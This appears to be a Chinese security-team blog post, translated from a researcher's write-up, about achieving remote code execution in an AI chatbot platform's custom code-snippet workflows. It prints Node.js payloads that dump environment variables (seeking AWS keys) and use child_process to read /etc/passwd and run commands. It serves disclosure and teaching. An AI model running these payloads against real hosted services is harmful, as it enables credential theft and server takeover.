#  探索AI聊天机器人工作流程实现RCE   
原创 玲珑安全官方  芳华绝代安全团队   2024-08-06 19:31  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1AoMVy0KnkqEMU3uEJcVqvr4Qicict0PZaDVUSfyyYDiauwQTMXZ4S6akHCfmKrS3V2gmUv8FvNxyEm3HZaianjyoQ/640?wx_fmt=jpeg "")  
##   
### 前言  
  
我发现了一个广泛使用的AI聊天机器人平台中的远程代码执行漏洞。该漏洞存在于聊天机器人的自定义工作流响应代码中，这些工作流允许开发人员通过创建定制的流程来扩展机器人的功能。  
### 正文  
  
在浏览自动化聊天机器人的多个特定功能时，其中一个引起我注意的功能是“Start from scratch”选项，如下所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkeBaWEibLzTUkUDsia7519n6LH0gbYcQ0lAIk3451PiafKy1G9SsFpUjRKw/640?wx_fmt=png&from=appmsg "")  
  
此“Start from scratch”选项包含多个用于定制聊天机器人自动化的选项，例如工作流、Webhooks和自定义代码片段，如下图所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkezMKicZdWwm9zDzaibCHEZODiarCT3rk1HSX8IVXoINaYKXI7I7fUlia4Vw/640?wx_fmt=png&from=appmsg "")  
  
查看其余选项后，我开始探索“运行代码片段”选项。  
  
该功能包含可自定义的代码，用于从聊天机器人获取自定义响应。  
例如下列代码存在一个默认值为“Hello World”的botMessage参数：  
```
const responseJson = {
  botMessage: "Hello world",
  responseExpected: false
}
```  
  
也就是定义了返回的消息和是否期待进一步响应的默认设置。  
  
由于  
聊天机器人是使用   
Node 18.x 框架构建的，我尝试获取/检查全局变量的响应，例如 __dirname、__filename，并尝试在“Hello World”位置执行像 eval(7*7) 这样的函数。  
  
例如：  
```
const responseJson = { 
botMessage : __dirname，
responseExpected : false
 }
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkebR7HZBnZVMF4YSGQicjdIib8qSKxUJPgFQZ3SC4ZvXicC8OlW3cW0J4SQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到，聊天机器  
人输出了**“/var/task”**，这意味着全局变量 __dirname 在内部成功执行。  
  
同理：  
```
const responseJson = { 
botMessage : __filename，
responseExpected : false
 }
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkenNuvautAPwWxTia3ua7PbK9C1poKWZwS8qjQJ9eDiaicrEcah8Pgt7uiaw/640?wx_fmt=png&from=appmsg "")  
  
输出**“/var/task/Template.js”**  
。  
  
同理：  
```
const responseJson = { 
botMessage：eval（7 * 7），
responseExpected：false
 }
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkeuVZMI38GHDds2HKwNhmrkvxuicTdIVV4rJLlfOAJ0TlEgHlFpy7Q0jQ/640?wx_fmt=png&from=appmsg "")  
  
输出49。  
  
接下来我想提高漏洞危害，于是我开始查看 Nodejs 官方文档，并找到了更多全局变量/对象来检查是否存在更多数据泄漏  
  
官方文档：https://nodejs.org/api/globals.html#process  
  
例如  
**process.env**  
、  
**process.argv**  
   
**process.execPath**  
、  
**process.memoryUsage()、 process.getuid() 、 process.cpuUsage()**  
等  
  
1、process.env  
```
const responseJson = {
botMessage: process.env,
responseExpected: false
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkeV4LekOfhwVDDZoorC31rbDActrokWCSxyVlafibicBoAIQj46Hl6PVqg/640?wx_fmt=png&from=appmsg "")  
  
检查环境变量至关重要，因为它们有时会存储 AWS_SECRET 和 AWS_KEY。  
  
2、process.platform  
```
const responseJson = {
botMessage: process.platform,
responseExpected: false
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkeaZN8jKSic0dpvLuDXFnkGcyqqfibukrHRpljLLJbVpLwfibcIqVShiaTAQ/640?wx_fmt=png&from=appmsg "")  
  
3、process.execPath  
```
const responseJson = {
botMessage: process.execPath,
responseExpected: false
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkeuoiaQQrTAU0AbdzE4mrIHXcs70xKmIwicicCbf6PDZbTe4rfzIc30vYnw/640?wx_fmt=png&from=appmsg "")  
  
4、process.memoryUsage()  
```
const responseJson = {
botMessage: process.memoryUsage(),
responseExpected: false
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkeyFFYhdNFMgaTZSjcyrsoy79nxibct4ibIJxpfJWc3VXvicTYMfbhic0COQ/640?wx_fmt=png&from=appmsg "")  
  
5、经过多次尝试、调试后，我创建出一个完整的  
**Payload**  
来获取/etc/passwd文件：  
```
const { exec } = require('child_process');

exports.main = (event, callback) => {
exec('head /etc/passwd', (error, stdout, stderr) => {
if (error) {
console.error(exec error: ${error});
return;
}
if (stderr) {
console.error(stderr: ${stderr});
return;
}

const responseJson = {
  botMessage: stdout,
  responseExpected: false
};

callback(responseJson);
});
};
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gkePjssmBp8TGPZpsu3nlL9BtUCa9FfM0CL6fR9EniatMlXxhN4Upbib35g/640?wx_fmt=png&from=appmsg "")  
  
运行“   
**id**  
 ”命令：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpXkrEq3ibIMXE0NBOUl3gke7ibF0QTckTYqPibIsvQrsa7LibAbCelALC2gEgLPAvGUW4EFu8S1fx7JQ/640?wx_fmt=png&from=appmsg "")  
  
原文出处：  
https://varmaanu001.medium.com/unveiling-remote-code-execution-in-ai-chatbot-workflows-3c7f633f63c3  
  
SRC漏洞挖掘培训  
  
[玲珑安全第三期如约而至](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247493447&idx=1&sn=04e4dfd799d0f22f5adfb1a50032d221&chksm=ebeb05ffdc9c8ce9a3d2916634a4fe3480685bf599150c2e128e20faeae4d2ddd0f12f96b630&scene=21#wechat_redirect)  
  
  
[第二期玲珑安全培训班来啦！](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247491250&idx=1&sn=0a1a522f09c42654a3eb2f314dfedffa&chksm=ebe8fc0adc9f751c60b0fa5c4c15bbc7947de1b50cbb8ecae11b51882a12612323d761e66f1a&scene=21#wechat_redirect)  
  
  
[玲珑安全第一期SRC培训班即将开课！](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247486139&idx=1&sn=11eb92b27684e41a86d26673ec4747f1&chksm=ebe8e803dc9f6115e18384bd62789bf5c5d1ad7de522faf92ebb52893a8cef4631a0f1459112&scene=21#wechat_redirect)  
  
  
往期漏洞分享  
  
[CR/LF注入+Race Condition绕过MFA](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247494480&idx=1&sn=6d203eb739fefc36ac9d21093def23df&chksm=ebeb09e8dc9c80fed57c493d1565b39aaaed3ce3e5fbca3531c6cd63150ba51a0a5b1bd65e23&scene=21#wechat_redirect)  
  
  
[CVSS 10信息披露+图片元数据不适当处理+大小写绕过速率限制](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247494475&idx=1&sn=28b09c0df494b74cd618ade4de105616&chksm=ebeb09f3dc9c80e5102e5a84f24ed250a1517c89fc42136c96a82347280164fe0e94f393d7e9&scene=21#wechat_redirect)  
  
  
[破解邀请码实现未授权访问和账户接管](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247494439&idx=1&sn=7e926d0a5f5e38426a612d1672ebdeb7&chksm=ebeb099fdc9c8089163372c77ca4928032b5082e761f134859b35681f2bec36cab5b79f39561&scene=21#wechat_redirect)  
  
  
[子域名模糊测试实现RCE](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247494424&idx=1&sn=c29423df3626026c4d87ea402cfc7b5f&chksm=ebeb09a0dc9c80b692dc7fe9822488e3d5a2a9e7a78425d2b022b6665eacba94a6b5ffb8caf5&scene=21#wechat_redirect)  
  
  
[通过导入功能将权限提升至管理员](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247494413&idx=1&sn=517080cb6292b57c8a0d274ba1cf0f8f&chksm=ebeb09b5dc9c80a305bcb2a3e6dc16e512965951470e90c8b36700205f53a736c88bb1e3251d&scene=21#wechat_redirect)  
  
  
[SSRF：Microsoft Azure API 管理服务](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247493949&idx=1&sn=e513345eee2ca4705ed9a3cfca6b03af&chksm=ebeb0b85dc9c829375aefdde0f6fa43a2084b145eda565c6d32b22884a224bc5e0c0cbf6a4c7&scene=21#wechat_redirect)  
  
  
[Oracle Apiary：SSRF获取元数据](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247493814&idx=1&sn=0ba43e7c5369f4b24e39099fa004d27c&chksm=ebeb0a0edc9c83182a2d59baf9835b84b9c5fc7f135ddb1d1696e30afe56fc9f9d9be4be08d0&scene=21#wechat_redirect)  
[SSRF 之 Azure Digital Twins Explorer](http://mp.weixin.qq.com/s?__biz=MzI4NTYwMzc5OQ==&mid=2247493743&idx=1&sn=3f5fe3b6e83d484107da879b18a6bc6d&chksm=ebeb0ad7dc9c83c160483306e2fe33d83877ad46e08257110a09d6b825e8e76e8669d63fdf30&scene=21#wechat_redirect)  
  
  
玲珑安全交流群  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpfQQzRic5l3dfdVz9ic3u2WBeIticfia6o694odqTFyAC0Uv8xyb9Eul3AFGRzo6ld8xUS3obxOxQX8Q/640?wx_fmt=png&from=appmsg "")  
  
玲珑安全B站免费公开课  
  
https://space.bilibili.com/602205041  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1AoMVy0KnkpVjiaTUMYPLzFcLHPRmjJaYgicYcibBOoTyko1d5gcfhxlu6BMmSFKeQMeqsda7jd3yEiaCekfJjrQXg/640?wx_fmt=png&from=appmsg "")  
  
  
